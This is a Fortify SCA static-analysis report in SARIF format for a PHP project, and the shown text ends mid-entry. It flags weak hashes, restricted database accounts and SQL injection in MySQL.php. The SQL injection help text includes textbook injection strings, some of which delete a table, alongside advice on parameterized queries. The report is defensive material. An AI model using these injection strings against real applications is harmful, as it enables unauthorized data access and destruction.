{
  "$schema" : "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "version" : "2.1.0",
  "runs" : [ {
    "tool" : {
      "driver" : {
        "name" : "Fortify SCA",
        "version" : "22.1.0.0166",
        "rules" : [ {
          "id" : "4418",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4418/?engineType=SCA&issue=22A552C1D0B7DE6004DF7B0D41D1269C"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4649",
          "shortDescription" : {
            "text" : "Database Bad Practices: Use of Restricted Accounts"
          },
          "fullDescription" : {
            "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
          },
          "help" : {
            "text" : "Windows Azure SQL Database supports only SQL Server Authentication. Windows Authentication (integrated security) is not supported. Users must provide credentials (login and password) every time they connect to Windows Azure SQL Database. Per Microsoft Windows Azure SQL Database General Guidelines and Limitations, the following account names are not available: admin, administrator, guest, root, sa.\n\nDo not use the following accounts in your database scripts: admin, administrator, guest, root, or sa.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4649/?engineType=SCA&issue=B78505312C2AE113116E2450770BDE09"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4685",
          "shortDescription" : {
            "text" : "Database Bad Practices: Use of Restricted Accounts"
          },
          "fullDescription" : {
            "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
          },
          "help" : {
            "text" : "Windows Azure SQL Database supports only SQL Server Authentication. Windows Authentication (integrated security) is not supported. Users must provide credentials (login and password) every time they connect to Windows Azure SQL Database. Per Microsoft Windows Azure SQL Database General Guidelines and Limitations, the following account names are not available: admin, administrator, guest, root, sa.\n\nDo not use the following accounts in your database scripts: admin, administrator, guest, root, or sa.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4685/?engineType=SCA&issue=D430C4E7F2BB607CB88903212658190C"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4441",
          "shortDescription" : {
            "text" : "Database Bad Practices: Use of Restricted Accounts"
          },
          "fullDescription" : {
            "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
          },
          "help" : {
            "text" : "Windows Azure SQL Database supports only SQL Server Authentication. Windows Authentication (integrated security) is not supported. Users must provide credentials (login and password) every time they connect to Windows Azure SQL Database. Per Microsoft Windows Azure SQL Database General Guidelines and Limitations, the following account names are not available: admin, administrator, guest, root, sa.\n\nDo not use the following accounts in your database scripts: admin, administrator, guest, root, or sa.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4441/?engineType=SCA&issue=3125AFD55D45BADB58EE834109C680C4"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4687",
          "shortDescription" : {
            "text" : "Database Bad Practices: Use of Restricted Accounts"
          },
          "fullDescription" : {
            "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
          },
          "help" : {
            "text" : "Windows Azure SQL Database supports only SQL Server Authentication. Windows Authentication (integrated security) is not supported. Users must provide credentials (login and password) every time they connect to Windows Azure SQL Database. Per Microsoft Windows Azure SQL Database General Guidelines and Limitations, the following account names are not available: admin, administrator, guest, root, sa.\n\nDo not use the following accounts in your database scripts: admin, administrator, guest, root, or sa.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4687/?engineType=SCA&issue=D713418FE0AFB00CF98631F0767AF542"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4726",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4726/?engineType=SCA&issue=ED77F6617A981440EFB19740A3EC5EE3"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4548",
          "shortDescription" : {
            "text" : "Database Bad Practices: Use of Restricted Accounts"
          },
          "fullDescription" : {
            "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
          },
          "help" : {
            "text" : "Windows Azure SQL Database supports only SQL Server Authentication. Windows Authentication (integrated security) is not supported. Users must provide credentials (login and password) every time they connect to Windows Azure SQL Database. Per Microsoft Windows Azure SQL Database General Guidelines and Limitations, the following account names are not available: admin, administrator, guest, root, sa.\n\nDo not use the following accounts in your database scripts: admin, administrator, guest, root, or sa.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4548/?engineType=SCA&issue=72705B3EA303DABE9054474BD60A00DC"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4700",
          "shortDescription" : {
            "text" : "Database Bad Practices: Use of Restricted Accounts"
          },
          "fullDescription" : {
            "text" : "An attempt was made to use one of the following accounts to connect to the database: admin, administrator, guest, root, or sa.\n\n\n"
          },
          "help" : {
            "text" : "Windows Azure SQL Database supports only SQL Server Authentication. Windows Authentication (integrated security) is not supported. Users must provide credentials (login and password) every time they connect to Windows Azure SQL Database. Per Microsoft Windows Azure SQL Database General Guidelines and Limitations, the following account names are not available: admin, administrator, guest, root, sa.\n\nDo not use the following accounts in your database scripts: admin, administrator, guest, root, or sa.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4700/?engineType=SCA&issue=E012F4752169342169741E2950CE382D"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4474",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 23 of MySQL.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4474/?engineType=SCA&issue=4DE40793DD1EAF073F0696D1D59D1A46"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4601",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 29 of MySQL.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4601/?engineType=SCA&issue=9649C54EF86E67BEF9F3FEF2B34AB3E8"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4480",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 37 of MySQL.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4480/?engineType=SCA&issue=5217A5CC445CBB5801B57000D43A76DE"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4368",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "Line 60 of MySQL.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in MySQL.php on line 60.\n\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4368/?engineType=SCA&issue=032EC727841646B522CCC764AEF636C2"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4593",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
